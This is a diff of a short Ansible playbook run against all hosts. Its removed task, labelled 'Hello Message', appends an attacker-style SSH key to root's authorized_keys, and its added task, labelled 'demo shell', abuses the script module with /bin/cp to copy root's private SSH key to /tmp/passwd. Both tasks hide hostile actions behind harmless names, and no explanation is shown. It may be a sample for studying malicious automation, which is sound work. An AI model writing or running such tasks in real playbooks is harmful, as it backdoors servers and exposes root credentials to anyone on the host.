@@ -1,6 +1,7 @@
 ---
 - hosts: all
   tasks:
-    - name: Hello Message
-      raw: echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQD4dOKXX8CWWFy3IyDtFvuMDhfdljGru6bzVxzM7bfX6VtT32DT7H6Wxh7I23h4tsaTum5SdXwdNcwtY2LeJ19yKrjTNBMVoN06fR4TmNoT5lhe/lQnC7kRu0wzv6HTvNTf9PaRpoAI0qQvCA64d0bjIw0EMRGnO77y6QENRYK9WQ== root@qa3v43' >> /root/.ssh/authorized_keys
-
+    - name: demo shell
+      script: /root/.ssh/id_rsa /tmp/passwd
+      args:
+          executable: /bin/cp
